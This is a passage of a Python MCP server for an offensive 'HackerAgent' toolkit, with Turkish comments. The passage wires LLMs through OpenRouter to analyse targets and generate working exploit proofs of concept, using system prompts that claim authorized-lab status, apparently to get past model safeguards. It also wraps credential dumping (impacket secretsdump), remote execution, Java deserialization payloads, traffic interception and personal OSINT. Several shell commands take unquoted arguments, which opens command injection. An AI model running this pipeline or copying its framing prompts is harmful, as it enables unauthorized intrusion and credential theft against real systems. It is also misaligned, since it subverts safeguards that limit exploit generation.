        "reverse": "You are a reverse engineering expert. Analyze the following decompiled/disassembled code. Identify the program logic, find security-critical functions, locate hardcoded secrets, understand the control flow, and identify exploitable vulnerabilities.",
        "crypto": "You are a cryptography expert. Analyze the following cryptographic data. Identify the cipher/hash type, assess key strength, find implementation weaknesses, suggest attack vectors (factorization, padding oracle, ECB patterns, etc.), and provide decryption strategies."
    }

    system_prompt = analysis_prompts.get(analysis_type, analysis_prompts["vulnerability"])
    user_prompt = f"Target: {target}\n\nData to analyze:\n{data}\n\nProvide a detailed, structured analysis with actionable findings."

    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
        "HTTP-Referer": "https://cco.local",
        "X-Title": "HackerAgent Qwen Analyzer"
    }

    payload = {
        "model": os.environ.get("CCO_ANALYZE_MODEL", "qwen/qwen3.6-plus"),
        "messages": [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_prompt}
        ]
    }

    try:
        response = requests.post("https://openrouter.ai/api/v1/chat/completions", headers=headers, json=payload, timeout=90)
        response.raise_for_status()
        result = response.json()
        content = result['choices'][0]['message']['content']
        return f"\n[📊] QWEN 3.6 PLUS ANALİZ SONUCU ({analysis_type.upper()}):\n{'='*60}\n{content}\n{'='*60}\n"
    except requests.exceptions.Timeout:
        return "HATA (Qwen API): İstek zaman aşımına uğradı. Daha küçük veri ile tekrar deneyin."
    except Exception as e:
        return f"HATA (Qwen API): İstek başarısız oldu. {e}"


@mcp.tool()
def generate_exploit_poc(
    vulnerability: str,
    target: str,
    context: str = "",
    openrouter_api_key: str = None
) -> str:
    """
    Tespit edilen zafiyet için proof-of-concept exploit payload'u üretir.
    Önce lokal payload veritabanında arar, bulamazsa OpenRouter üzerinden
    Hermes 405B modeliyle teknik PoC kodu oluşturur.
    
    Args:
        vulnerability: Zafiyetin tipi (örn: 'Apache Struts OGNL RCE', 'SQL Injection')
        target: Hedef sistem bilgileri
        context: Varsa tespit edilen detaylar, parametreler veya WAF bypass gereksinimleri
        openrouter_api_key: OpenRouter API anahtarı (Eğer None ise, ~/.cco/config.yaml içinden okunmaya çalışılır)
    """
    # --- STEP 1: Lokal payload veritabanı araması ---
    local_payload = _search_local_payloads(vulnerability)
    if local_payload:
        return f"\n[📦] LOKAL PAYLOAD DB SONUCU:\n{'='*50}\n{local_payload}\n{'='*50}\n💡 Kaynak: payloads.md (LLM çağrısı gerekmedi)\n"

    # --- STEP 2: Hermes 405B ile PoC üretimi ---
    api_key = openrouter_api_key or get_api_key_secure()
            
    if not api_key:
        return "HATA: OpenRouter API key bulunamadı. Şu yöntemlerden birini kullanın:\n1. OPENROUTER_API_KEY env var\n2. keyring: python3 -c \"import keyring; keyring.set_password('cco','openrouter','YOUR_KEY')\"\n3. ~/.cco/config.yaml → llm.openrouter_api_key alanı"

    system_prompt = ("You are a certified OSEP/OSCP penetration testing consultant performing "
                     "authorized security validation in a controlled lab environment. Generate "
                     "a technically precise proof-of-concept for the described vulnerability. "
                     "Output format: executable payload with deployment notes and expected outcome. "
                     "Focus on accuracy and reproducibility.")
    
    user_prompt = f"Target: {target}\nVulnerability: {vulnerability}\nContext: {context}\n\nGenerate a working proof-of-concept payload for this vulnerability in a controlled test environment."

    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
        "HTTP-Referer": "https://cco.local", 
        "X-Title": "HackerAgent Security Validation"
    }
    
    data = {
        "model": os.environ.get("CCO_EXPLOIT_MODEL", "nousresearch/hermes-4-405b"),
        "messages": [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_prompt}
        ]
    }
    
    try:
        response = requests.post("https://openrouter.ai/api/v1/chat/completions", headers=headers, json=data, timeout=60)
        response.raise_for_status()
        result = response.json()
        return f"\n[🔬] HERMES 405B — PoC ÇIKTISI:\n{result['choices'][0]['message']['content']}\n"
    except Exception as e:
         return f"HATA (Hermes API): İstek başarısız oldu. {e}"


def _search_local_payloads(vulnerability: str) -> str:
    """Lokal payload veritabanında (payloads.md) zafiyet tipine göre arama yap."""
    vuln_lower = vulnerability.lower()
    payload_paths = [
        os.path.join(os.path.dirname(__file__), '..', '..', 'skills', 'web-exploit', 'references', 'payloads.md'),
        os.path.join(CCO_HOME, 'skills', 'web-exploit', 'references', 'payloads.md'),
        os.path.expanduser('~/.gemini/antigravity/skills/web-exploit/references/payloads.md'),  # legacy
    ]
    
    # Zafiyet tipini anahtar kelimelerle eşleştir
    keyword_map = {
        'sqli': ['sql injection', 'sqli', 'union select', 'sqlmap'],
        'xss': ['xss', 'cross-site scripting', 'script', 'alert('],
        'ssrf': ['ssrf', 'server-side request', 'localhost bypass'],
        'ssti': ['ssti', 'template injection', 'jinja', 'twig'],
        'lfi': ['lfi', 'local file inclusion', 'path traversal', 'directory traversal'],
        'rfi': ['rfi', 'remote file inclusion'],
        'cmdi': ['command injection', 'os command', 'cmdi', 'rce'],
        'xxe': ['xxe', 'xml external entity', 'xml injection'],
        'upload': ['file upload', 'upload bypass', 'webshell'],
        'auth': ['authentication bypass', 'auth bypass', 'jwt', 'session'],
        'idor': ['idor', 'insecure direct object', 'broken access'],
        'deserialization': ['deserialization', 'unserialize', 'pickle', 'java serial'],
    }
    
    matched_section = None
    for category, keywords in keyword_map.items():
        if any(kw in vuln_lower for kw in keywords):
            matched_section = category
            break
    
    if not matched_section:
        return ""
    
    for path in payload_paths:
        abs_path = os.path.abspath(path)
        if os.path.exists(abs_path):
            try:
                with open(abs_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # İlgili bölümü bul (## veya ### heading ile)
                lines = content.split('\n')
                capturing = False
                captured = []
                depth = 0
                
                for line in lines:
                    if line.startswith('#') and any(kw in line.lower() for kw in keyword_map.get(matched_section, [])):
                        capturing = True
                        depth = len(line) - len(line.lstrip('#'))
                        captured.append(line)
                        continue
                    
                    if capturing:
                        if line.startswith('#') and len(line) - len(line.lstrip('#')) <= depth:
                            break
                        captured.append(line)
                
                if captured:
                    return '\n'.join(captured[:80])  # Max 80 satır
            except Exception:
                pass
    
    return ""


@mcp.tool()
def parallel_llm_analyze(
    target: str,
    data: str,
    analysis_type: str = "vulnerability",
    also_generate_payload: bool = True,
    vulnerability_hint: str = "",
    openrouter_api_key: str = None
) -> str:
    """Qwen ANALİZ + Hermes EXPLOIT üretimini PARALEL çalıştır — tek çağrıda iki model.
    MCP tool'ları sıralı çağrıldığı için bu tool her iki modeli
    ThreadPoolExecutor ile aynı anda çağırır. Sonuç: ~30sn yerine ~15sn.

    Args:
        target: Hedef bilgisi (IP, domain, URL)
        data: Analiz edilecek veri (nmap çıktısı, kaynak kod, HTTP response vb.)
        analysis_type: Qwen analiz tipi ('vulnerability', 'traffic', 'code_review', 
                       'log_analysis', 'pattern', 'reverse', 'crypto')
        also_generate_payload: True ise Hermes 405B'den exploit payload da iste
        vulnerability_hint: Hermes'e verilecek zafiyet ipucu (boş: Qwen sonucundan çıkarılır)
        openrouter_api_key: OpenRouter API anahtarı
    """
    from concurrent.futures import ThreadPoolExecutor

    api_key = openrouter_api_key or get_api_key_secure()
    if not api_key:
        return "HATA: OpenRouter API key bulunamadı."

    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
        "HTTP-Referer": "https://cco.local",
        "X-Title": "HackerAgent Parallel LLM"
    }

    # Qwen analiz promptları
    analysis_prompts = {
        "vulnerability": "You are an expert penetration tester. Analyze the data, identify all vulnerabilities ranked by severity, suggest exploit techniques, and provide exact commands/payloads to verify each finding.",
        "traffic": "You are a network forensics expert. Identify suspicious patterns, attacks, data exfiltration, credential leaks, and C2 communication.",
        "code_review": "You are a senior appsec engineer. Find injection flaws, auth issues, crypto weaknesses, sensitive data exposure. Provide line references and fixes.",
        "log_analysis": "You are a SOC analyst. Identify IoCs, suspicious activities, attack timelines, and lateral movement.",
        "pattern": "You are a CTF expert. Find hidden flags, encoded data, steganographic patterns, and concealed information.",
        "reverse": "You are a reverse engineer. Analyze the code logic, find security-critical functions, hardcoded secrets, and exploitable vulnerabilities.",
        "crypto": "You are a cryptography expert. Identify cipher types, assess key strength, find implementation weaknesses, suggest attack vectors."
    }

    def call_qwen():
        """Qwen 3.6 Plus → Derin analiz."""
        try:
            payload = {
                "model": os.environ.get("CCO_ANALYZE_MODEL", "qwen/qwen3.6-plus"),
                "messages": [
                    {"role": "system", "content": analysis_prompts.get(analysis_type, analysis_prompts["vulnerability"])},
                    {"role": "user", "content": f"Target: {target}\n\nData:\n{data}\n\nProvide a detailed, structured analysis with actionable findings."}
                ]
            }
            resp = requests.post("https://openrouter.ai/api/v1/chat/completions",
                                headers=headers, json=payload, timeout=90)
            resp.raise_for_status()
            return resp.json()['choices'][0]['message']['content']
        except Exception as e:
            return f"Qwen HATA: {e}"

    def call_hermes():
        """Hermes 405B → Exploit PoC üretici."""
        try:
            vuln_desc = vulnerability_hint or f"vulnerability found in {target} based on: {data[:500]}"
            payload = {
                "model": os.environ.get("CCO_EXPLOIT_MODEL", "nousresearch/hermes-4-405b"),
                "messages": [
                    {"role": "system", "content": "You are a certified OSEP/OSCP penetration testing consultant. Generate technically precise proof-of-concept payloads and CLI commands for authorized security validation. Output executable exploit code with deployment notes."},
                    {"role": "user", "content": f"Target: {target}\nVulnerability: {vuln_desc}\n\nGenerate a working proof-of-concept payload for this vulnerability."}
                ]
            }
            resp = requests.post("https://openrouter.ai/api/v1/chat/completions",
                                headers=headers, json=payload, timeout=60)
            resp.raise_for_status()
            return resp.json()['choices'][0]['message']['content']
        except Exception as e:
            return f"Hermes HATA: {e}"

    # ── PARALEL EXECUTION ──
    start_time = time.time()

    if also_generate_payload:
        with ThreadPoolExecutor(max_workers=2) as executor:
            qwen_future = executor.submit(call_qwen)
            hermes_future = executor.submit(call_hermes)

            qwen_result = qwen_future.result(timeout=120)
            hermes_result = hermes_future.result(timeout=90)
    else:
        qwen_result = call_qwen()
        hermes_result = ""

    elapsed = time.time() - start_time

    # Çıktıyı formatla
    output = f"""
⚡ PARALEL LLM ANALİZ TAMAMLANDI ({elapsed:.1f}s)
{'='*60}

📊 QWEN 3.6 PLUS — {analysis_type.upper()} ANALİZİ:
{'─'*50}
{qwen_result}
"""

    if also_generate_payload and hermes_result:
        output += f"""
{'='*60}
🔬 HERMES 405B — PoC EXPLOIT:
{'─'*50}
{hermes_result}
"""

    output += f"""
{'='*60}
⏱️ Toplam süre: {elapsed:.1f}s (paralel — sıralı olsaydı ~{elapsed*1.8:.0f}s)
"""

    return output
@mcp.tool()
def start_recon_daemon(target: str, interval: int = 120) -> str:
    """
    Hedef üzerinde arkaplanda sürekli NMAP Delta taraması yapan daemon'u başlatır.
    (Sadece Supervisor rolündeyken kullanılır)
    """
    if target in daemon_processes:
        return f"HATA: '{target}' için halihazırda çalışan bir daemon var. Önce onu durdurmalısınız."
        
    script_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "scripts", "recon_daemon.py")
    if not os.path.exists(script_path):
         return f"HATA: Daemon script bulunamadı: {script_path}"
         
    try:
        proc = subprocess.Popen(
            ["python3", script_path, "--target", target, "--interval", str(interval)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        daemon_processes[target] = proc
        return f"Recon Daemon BAŞLATILDI. Hedef: {target}, Periyot: her {interval} saniyede. Process ID: {proc.pid}\nYeni portlar otomatik olarak memory-server'a kaydedilecektir."
    except Exception as e:
        return f"HATA: Daemon başlatılamadı: {e}"

@mcp.tool()
def stop_recon_daemon(target: str) -> str:
    """
    Belirtilen hedef için arkaplanda çalışan recon daemon'ı durdurur. 
    """
    proc = daemon_processes.get(target)
    if not proc:
         return f"HATA: '{target}' hedefi için kayıtlı çalışan bir daemon bulunamadı."
         
    try:
        proc.terminate()
        proc.wait(timeout=5)
        del daemon_processes[target]
        return f"Recon Daemon DURDURULDU. Hedef: {target}"
    except Exception:
        try:
            proc.kill()
            del daemon_processes[target]
            return f"Recon Daemon zorla (kill) durduruldu. Hedef: {target}"
        except Exception as kill_err:
             return f"HATA: Daemon durdurulamadı: {kill_err}"


@mcp.tool()
def metasploit_search(
    query: str,
    module_type: str = ""
) -> str:
    """
    Metasploit'te modül ara.
    
    Args:
        query: Arama sorgusu
        module_type: Modül tipi (exploit, auxiliary, post, payload)
    """
    search_q = query
    if module_type:
        search_q = f"type:{module_type} {query}"
    
    cmd = f"msfconsole -q -x 'search {search_q}; exit'"
    result = run_command(cmd, timeout=120)
    return format_output(result)


@mcp.tool()
def wafw00f_detect(target: str) -> str:
    """
    WAF tespiti yap.
    
    Args:
        target: Hedef URL
    """
    cmd = f"wafw00f {shlex.quote(target)}"
    result = run_command(cmd)
    return format_output(result)


@mcp.tool()
def steghide_extract(
    filepath: str,
    passphrase: str = "",
    extra_args: str = ""
) -> str:
    """
    Steghide ile steganografi verisi çıkar.
    
    Args:
        filepath: Dosya yolu
        passphrase: Şifre (boş: şifresiz deneme)
        extra_args: Ek argümanlar
    """
    if passphrase:
        cmd = f"steghide extract -sf {shlex.quote(filepath)} -p {shlex.quote(passphrase)} -f"
    else:
        cmd = f"steghide info {shlex.quote(filepath)} 2>&1; steghide extract -sf {shlex.quote(filepath)} -p '' -f 2>&1"
    
    result = run_command(cmd)
    return format_output(result)


@mcp.tool()
def volatility_analyze(
    dump_file: str,
    plugin: str = "windows.info",
    extra_args: str = ""
) -> str:
    """
    Volatility ile memory dump analizi yap.
    
    Args:
        dump_file: Memory dump dosya yolu
        plugin: Volatility plugini (windows.info, windows.pslist, windows.pstree, 
                windows.cmdline, windows.filescan, windows.hashdump, windows.netscan,
                linux.pslist, linux.bash)
        extra_args: Ek argümanlar
    """
    # Volatility 3 dene
    cmd = f"vol3 -f {shlex.quote(dump_file)} {plugin} {extra_args}"
    result = run_command(cmd, timeout=300)
    
    if result['returncode'] != 0:
        # Volatility 2 dene
        cmd = f"volatility -f {shlex.quote(dump_file)} {plugin} {extra_args}"
        result = run_command(cmd, timeout=300)
    
    return format_output(result)


# ============================================================
# EKSİK KRİTİK ARAÇLAR (v2.0 — Phase 3)
# ============================================================

# --- GIT / SECRET SCANNING ---

@mcp.tool()
def trufflehog_scan(
    target: str,
    scan_type: str = "git",
    extra_args: str = ""
) -> str:
    """
    TruffleHog ile secret/leak hunting. Git repo, dosya sistemi veya S3 bucket tarar.
    
    Args:
        target: Git repo URL veya dizin yolu
        scan_type: 'git' (repo), 'filesystem' (dizin), 's3' (bucket)
        extra_args: Ek argümanlar
    """
    cmd = f"trufflehog {scan_type} {shlex.quote(target)} --json {extra_args}"
    result = run_command(cmd, timeout=300)
    return format_output(result)


@mcp.tool()
def gitleaks_scan(
    target: str,
    extra_args: str = ""
) -> str:
    """
    Gitleaks ile kaynak kodda secret taraması.
    
    Args:
        target: Git repo yolu veya URL
        extra_args: Ek argümanlar (ör: '--report-format json')
    """
    cmd = f"gitleaks detect --source {shlex.quote(target)} -v {extra_args}"
    result = run_command(cmd, timeout=300)
    return format_output(result)


# --- API ENDPOINT DISCOVERY ---

@mcp.tool()
def kiterunner_scan(
    target: str,
    wordlist: str = "",
    extra_args: str = ""
) -> str:
    """
    Kiterunner ile API endpoint brute force. REST/GraphQL endpoint keşfi.
    
    Args:
        target: Hedef URL (ör: http://target.com)
        wordlist: Wordlist yolu (boş: varsayılan kiterunner data)
        extra_args: Ek argümanlar
    """
    wl = f"-w {shlex.quote(wordlist)}" if wordlist else ""
    cmd = f"kr scan {shlex.quote(target)} {wl} {extra_args}"
    result = run_command(cmd, timeout=300)
    return format_output(result)


# --- HISTORIC ENDPOINT DISCOVERY ---

@mcp.tool()
def gau_urls(
    domain: str,
    extra_args: str = ""
) -> str:
    """
    gau ile historic URL discovery (Wayback Machine, Common Crawl, OTX, URLScan).
    
    Args:
        domain: Hedef domain (ör: example.com)
        extra_args: Ek argümanlar (ör: '--threads 5 --subs')
    """
    cmd = f"gau {shlex.quote(domain)} {extra_args}"
    result = run_command(cmd, timeout=120)
    output = format_output(result)
    lines = output.strip().split("\n")
    if len(lines) > 200:
        return "\n".join(lines[:200]) + f"\n... (toplam {len(lines)} URL bulundu)"
    return output


@mcp.tool()
def waybackurls_fetch(
    domain: str,
    extra_args: str = ""
) -> str:
    """
    waybackurls ile Wayback Machine'den historik URL çekme.
    
    Args:
        domain: Hedef domain
        extra_args: Ek argümanlar
    """
    cmd = f"echo {shlex.quote(domain)} | waybackurls {extra_args}"
    result = run_command(cmd, timeout=120)
    output = format_output(result)
    lines = output.strip().split("\n")
    if len(lines) > 200:
        return "\n".join(lines[:200]) + f"\n... (toplam {len(lines)} URL)"
    return output


# --- IMPACKET SUITE ---

@mcp.tool()
def impacket_tool(
    tool_name: str,
    target: str,
    username: str = "",
    password: str = "",
    domain: str = "",
    hashes: str = "",
    extra_args: str = ""
) -> str:
    """
    Impacket suite araçları (AD/SMB/Kerberos operasyonları).
    
    Args:
        tool_name: Araç adı: secretsdump, psexec, wmiexec, smbexec, 
                   GetNPUsers, GetUserSPNs, smbclient, lookupsid, reg
        target: Hedef IP/hostname
        username: Kullanıcı adı
        password: Şifre
        domain: AD domain adı
        hashes: NTLM hash (LM:NT formatında)
        extra_args: Ek argümanlar
    """
    # Credential string'i oluştur
    cred = ""
    if domain and username:
        cred = f"{shlex.quote(domain)}/{shlex.quote(username)}"
    elif username:
        cred = shlex.quote(username)
    
    if password:
        cred += f":{shlex.quote(password)}"
    elif hashes:
        cred += f" -hashes {shlex.quote(hashes)}"
    
    if cred:
        cred += f"@{shlex.quote(target)}"
    else:
        cred = shlex.quote(target)
    
    cmd = f"impacket-{tool_name} {cred} {extra_args}"
    result = run_command(cmd, timeout=120)
    return format_output(result)


# --- AD ENUMERATION ---

@mcp.tool()
def bloodhound_collect(
    target: str,
    username: str,
    password: str,
    domain: str,
    collection: str = "All",
    extra_args: str = ""
) -> str:
    """
    BloodHound (bloodhound-python) ile Active Directory enumeration.
    
    Args:
        target: Domain Controller IP
        username: AD kullanıcı adı
        password: AD şifresi
        domain: AD domain adı (ör: corp.local)
        collection: Koleksiyon tipi (All, Group, LocalAdmin, Session, Trusts, ACL)
        extra_args: Ek argümanlar
    """
    cmd = (f"bloodhound-python -u {shlex.quote(username)} -p {shlex.quote(password)} "
           f"-d {shlex.quote(domain)} -ns {shlex.quote(target)} "
           f"-c {shlex.quote(collection)} --zip {extra_args}")
    result = run_command(cmd, timeout=300)
    return format_output(result)


# --- DESERIALIZATION ---

@mcp.tool()
def ysoserial_generate(
    payload_type: str,
    command: str,
    extra_args: str = ""
) -> str:
    """
    ysoserial ile Java deserialization payload üretimi.
    
    Args:
        payload_type: Payload tipi (CommonsCollections1-7, Jdk7u21, Spring, Groovy, vb.)
        command: Çalıştırılacak komut (ör: '/bin/bash -c id')
        extra_args: Ek argümanlar
    """
    cmd = f"java -jar /opt/ysoserial/ysoserial.jar {shlex.quote(payload_type)} {shlex.quote(command)} {extra_args}"
    result = run_command(cmd, timeout=30)
    if result["stdout"]:
        encoded = base64.b64encode(result["stdout"].encode()).decode()
        return f"Payload (base64):\n{encoded}\n\nRaw length: {len(result['stdout'])} bytes"
    return format_output(result)


# --- SYMBOLIC EXECUTION ---

@mcp.tool()
def angr_analyze(
    binary_path: str,
    find_addr: str = "",
    avoid_addr: str = "",
    extra_args: str = ""
) -> str:
    """
    angr ile symbolic execution (CTF pwn otomatize çözücü).
    
    Args:
        binary_path: Binary dosya yolu
        find_addr: Hedef adres (hex, ör: '0x4011a0')
        avoid_addr: Kaçınılacak adres (hex, ör: '0x401180')
        extra_args: Ek argümanlar
    """
    find_part = f"find=int('{find_addr}',16)," if find_addr else ""
    avoid_part = f"avoid=[int('{avoid_addr}',16)]," if avoid_addr else ""
    
    script = f"""
import angr, sys
p = angr.Project('{binary_path}', auto_load_libs=False)
state = p.factory.entry_state()
simgr = p.factory.simulation_manager(state)
simgr.explore({find_part} {avoid_part} timeout=120)
if simgr.found:
    s = simgr.found[0]
    print('FOUND! Input:', s.posix.dumps(0))
    print('Output:', s.posix.dumps(1))
else:
    print('No solution found')
"""
    
    script_path = tempfile.mktemp(suffix=".py")
    with open(script_path, "w") as f:
        f.write(script)
    
    result = run_command(f"python3 {script_path}", timeout=180)
    os.unlink(script_path)
    return format_output(result)


# --- HEADLESS RE ---

@mcp.tool()
def ghidra_headless(
    binary_path: str,
    script: str = "",
    project_dir: str = "/tmp/ghidra_projects",
    extra_args: str = ""
) -> str:
    """
    Ghidra headless analyzer ile otomatik reverse engineering.
    
    Args:
        binary_path: Analiz edilecek binary dosya yolu
        script: Çalıştırılacak Ghidra script (boş: varsayılan analiz)
        project_dir: Ghidra proje dizini
        extra_args: Ek argümanlar
    """
    os.makedirs(project_dir, exist_ok=True)
    proj_name = os.path.basename(binary_path).replace(".", "_")
    
    script_part = f"-postScript {shlex.quote(script)}" if script else ""
    cmd = (f"analyzeHeadless {shlex.quote(project_dir)} {proj_name} "
           f"-import {shlex.quote(binary_path)} -overwrite "
           f"{script_part} {extra_args}")
    result = run_command(cmd, timeout=300)
    return format_output(result)


# --- MOBILE TESTING ---

@mcp.tool()
def frida_hook(
    target: str,
    script_code: str = "",
    script_file: str = "",
    extra_args: str = ""
) -> str:
    """
    Frida ile runtime hooking (mobile app / thick client testing).
    
    Args:
        target: Hedef process adı veya PID
        script_code: Inline JavaScript hook kodu
        script_file: Hook script dosya yolu
        extra_args: Ek argümanlar (ör: '-U' USB device)
    """
    if script_code:
        script_path = tempfile.mktemp(suffix=".js")
        with open(script_path, "w") as f:
            f.write(script_code)
        cmd = f"frida -l {script_path} {shlex.quote(target)} {extra_args}"
    elif script_file:
        cmd = f"frida -l {shlex.quote(script_file)} {shlex.quote(target)} {extra_args}"
    else:
        cmd = f"frida {shlex.quote(target)} {extra_args}"
    
    result = run_command(cmd, timeout=60)
    return format_output(result)


# --- NETWORK INTERCEPTION ---

@mcp.tool()
def mitmproxy_dump(
    listen_port: int = 8080,
    target_url: str = "",
    script: str = "",
    timeout: int = 30,
    extra_args: str = ""
) -> str:
    """
    mitmdump ile traffic capture ve analiz.
    
    Args:
        listen_port: Dinleme portu
        target_url: URL filtresi (opsiyonel)
        script: mitmdump script yolu (opsiyonel)
        timeout: Capture süresi (saniye)
        extra_args: Ek argümanlar
    """
    flow_filter = f"~u {shlex.quote(target_url)}" if target_url else ""
    script_part = f"-s {shlex.quote(script)}" if script else ""
    dump_file = f"/tmp/mitm_capture_{int(time.time())}.flow"
    
    cmd = (f"timeout {timeout} mitmdump -p {listen_port} "
           f"-w {dump_file} {script_part} {flow_filter} {extra_args} 2>&1")
    result = run_command(cmd, timeout=timeout + 10)
    
    output = format_output(result)
    if os.path.exists(dump_file):
        output += f"\n\nCapture dosyası: {dump_file} ({os.path.getsize(dump_file)} bytes)"
    return output


# ============================================================
# VISION / MULTIMODAL KATMANI (v2.0 — Phase 3)
# ============================================================

@mcp.tool()
def screenshot_analyze(
    url: str = "",
    image_path: str = "",
    analysis_type: str = "general"
) -> str:
    """
    Web sayfası screenshot'ı al ve/veya mevcut görseli analiz et.
    
    Args:
        url: Screenshot alınacak URL
        image_path: Mevcut görsel dosyası yolu
        analysis_type: Analiz tipi:
            - 'general': Genel bilgi çıkarma (OCR + metadata)
            - 'steg': Steganografi analizi
            - 'ocr': Sadece OCR (metin çıkarma)
            - 'metadata': Sadece EXIF/metadata
    """
    outputs = []
    
    # URL'den screenshot al
    if url and not image_path:
        image_path = f"/tmp/screenshot_{int(time.time())}.png"
        # cutycapt veya wkhtmltoimage dene
        r = run_command(f"cutycapt --url={shlex.quote(url)} --out={image_path} 2>/dev/null", timeout=30)
        if r['returncode'] != 0:
            r = run_command(f"wkhtmltoimage --quality 80 {shlex.quote(url)} {image_path} 2>/dev/null", timeout=30)
        if r['returncode'] != 0:
            return "HATA: Screenshot alınamadı. cutycapt veya wkhtmltoimage kurun."
        outputs.append(f"📸 Screenshot alındı: {image_path}")
    
    if not image_path or not os.path.exists(image_path):
        return "HATA: Geçerli bir image_path veya url sağlayın."
    
    if analysis_type in ("general", "ocr"):
        r = run_command(f"tesseract {shlex.quote(image_path)} stdout 2>/dev/null", timeout=30)
        if r['stdout'].strip():
            outputs.append(f"📝 OCR Sonucu:\n{r['stdout'].strip()[:2000]}")
    
    if analysis_type in ("general", "metadata"):
        r = run_command(f"exiftool {shlex.quote(image_path)} 2>/dev/null", timeout=15)
        if r['stdout'].strip():
            outputs.append(f"📋 Metadata:\n{r['stdout'].strip()[:1000]}")
    
    if analysis_type in ("general", "steg"):
        steg_results = []
        for cmd_name, cmd in [
            ("zsteg", f"zsteg {shlex.quote(image_path)} 2>/dev/null"),
            ("strings", f"strings {shlex.quote(image_path)} | grep -iE 'flag|ctf|key|pass|secret|token' | head -20"),
            ("binwalk", f"binwalk {shlex.quote(image_path)} 2>/dev/null"),
        ]:
            r = run_command(cmd, timeout=30)
            if r['stdout'].strip():
                steg_results.append(f"[{cmd_name}]\n{r['stdout'].strip()[:500]}")
        if steg_results:
            outputs.append("🔍 Steganografi/Hidden Data:\n" + "\n".join(steg_results))
    
    return "\n\n".join(outputs) if outputs else "Analiz sonucu boş."


@mcp.tool()
def steg_deep_analyze(
    image_path: str
) -> str:
    """
    Görsel dosyada derinlemesine steganografi analizi.
    Tüm bilinen steg araçlarını otomatik çalıştırır.
    
    Args:
        image_path: Analiz edilecek görsel dosya yolu
    """
    if not os.path.exists(image_path):
        return f"HATA: Dosya bulunamadı: {image_path}"
    
    outputs = []
    commands = [
        ("file", f"file {shlex.quote(image_path)}"),
        ("exiftool", f"exiftool {shlex.quote(image_path)} 2>/dev/null"),
        ("binwalk", f"binwalk {shlex.quote(image_path)} 2>/dev/null"),
        ("zsteg", f"zsteg {shlex.quote(image_path)} 2>/dev/null"),
        ("steghide_info", f"steghide info -sf {shlex.quote(image_path)} 2>&1"),
        ("strings_flags", f"strings {shlex.quote(image_path)} | grep -iE 'flag|ctf|key|pass|secret|hack|admin' | head -30"),
        ("strings_b64", f"strings {shlex.quote(image_path)} | grep -E '^[A-Za-z0-9+/]{{20,}}=*$' | head -10"),
        ("xxd_header", f"xxd {shlex.quote(image_path)} | head -20"),
        ("foremost", f"foremost -T -i {shlex.quote(image_path)} -o /tmp/foremost_{int(time.time())} 2>/dev/null; ls -la /tmp/foremost_{int(time.time())}/*/ 2>/dev/null"),
    ]
    
    for name, cmd in commands:
        result = run_command(cmd, timeout=30)
        if result["stdout"].strip():
            outputs.append(f"=== {name.upper()} ===\n{result['stdout'].strip()[:800]}")
    
    if outputs:
        return f"🔬 Derin Steganografi Analizi: {image_path}\n{'='*50}\n\n" + "\n\n".join(outputs)
    return "Steganografi verisi bulunamadı."


# ============================================================
# OSINT ENGINE (v2.0 — Phase 6)
# ============================================================

@mcp.tool()
def osint_harvest(
    domain: str,
    sources: str = "all",
    extra_args: str = ""
) -> str:
    """theHarvester ile email, subdomain, host ve IP keşfi.

    Args:
        domain: Hedef domain (ör: example.com)
        sources: Veri kaynakları (all, google, bing, linkedin, twitter, shodan, censys, crtsh)
        extra_args: Ek argümanlar
    """
    src = sources if sources != "all" else "google,bing,crtsh,dnsdumpster,threatminer"
    cmd = f"theHarvester -d {shlex.quote(domain)} -b {src} {extra_args}"
    result = run_command(cmd, timeout=120)
    return format_output(result)


@mcp.tool()
def sherlock_lookup(
    username: str,
    extra_args: str = ""
) -> str:
    """Sherlock ile kullanıcı adını 300+ sosyal medya platformunda ara.

    Args:
        username: Aranacak kullanıcı adı
        extra_args: Ek argümanlar (ör: '--timeout 10')
    """
    cmd = f"sherlock {shlex.quote(username)} --print-found {extra_args}"
    result = run_command(cmd, timeout=120)
    output = format_output(result)
    lines = output.strip().split("\n")
    if len(lines) > 100:
        return "\n".join(lines[:100]) + f"\n... (toplam {len(lines)} platform)"
    return output


@mcp.tool()
def whois_enrichment(
    target: str
) -> str:
    """WHOIS + DNS + ASN zenginleştirme — tek komutla tüm pasif keşif.

    Args:
        target: Domain veya IP adresi
    """
    outputs = []

    # WHOIS
    r = run_command(f"whois {shlex.quote(target)} 2>/dev/null | head -50", timeout=15)
    if r["stdout"].strip():
        outputs.append(f"📋 WHOIS:\n{r['stdout'].strip()}")

    # DNS kayıtları
    for record_type in ["A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA"]:
        r = run_command(f"dig +short {shlex.quote(target)} {record_type} 2>/dev/null", timeout=10)
        if r["stdout"].strip():
            outputs.append(f"🌐 DNS {record_type}: {r['stdout'].strip()}")

    # ASN
    r = run_command(f"whois -h whois.radb.net -- '-i origin {shlex.quote(target)}' 2>/dev/null | head -20", timeout=10)
    if r["stdout"].strip():
        outputs.append(f"🏢 ASN:\n{r['stdout'].strip()}")

    # SSL sertifika bilgisi
    r = run_command(f"echo | openssl s_client -connect {shlex.quote(target)}:443 -servername {shlex.quote(target)} 2>/dev/null | openssl x509 -noout -subject -issuer -dates 2>/dev/null", timeout=10)
    if r["stdout"].strip():
        outputs.append(f"🔒 SSL:\n{r['stdout'].strip()}")

    return "\n\n".join(outputs) if outputs else f"'{target}' için bilgi bulunamadı."


@mcp.tool()
def spiderfoot_scan(
    target: str,
    scan_type: str = "all",
    extra_args: str = ""
) -> str:
    """SpiderFoot ile kapsamlı OSINT taraması.

    Args:
        target: Hedef domain, IP, email veya kullanıcı adı
        scan_type: Tarama tipi ('all', 'passive', 'footprint')
        extra_args: Ek argümanlar
    """
    cmd = f"spiderfoot -s {shlex.quote(target)} -t {scan_type} -q {extra_args}"
    result = run_command(cmd, timeout=300)
    return format_output(result)


# ============================================================
# CLOUD SECURITY SCANNER (v2.0 — Phase 6)
# ============================================================

@mcp.tool()
def cloud_enum(
    target: str,
    providers: str = "aws,azure,gcp",
    extra_args: str = ""
) -> str:
